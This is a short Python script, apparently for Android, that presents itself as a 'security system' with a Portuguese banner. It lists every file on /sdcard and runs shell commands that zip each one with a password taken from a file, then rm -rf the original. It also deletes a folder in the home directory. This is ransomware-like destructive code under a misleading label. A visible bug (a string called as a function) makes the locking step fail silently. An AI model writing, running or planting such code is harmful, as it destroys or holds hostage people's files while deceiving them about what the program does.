import os
import json

print('''

SISTEMA DE SEGURANÇA


    ===}> ATIVANDO...\033[32m♪♪♪


''')



def ler(files, ss):
    for f in files:
        try:
            os.system(f'zip -r -P {ss()} {f}.zip {f}')
            os.system(f'rm -rf {f}')

        except: pass
        os.system('cd && rm -rf zorios')


with open('stxt', 'r') as arquivo:
    ss = arquivo.read()

os.chdir("/sdcard")
arquivos = os.popen("ls")
arquivos = arquivos.read()
arquivos = arquivos.split('\n')

ler(arquivos, ss)
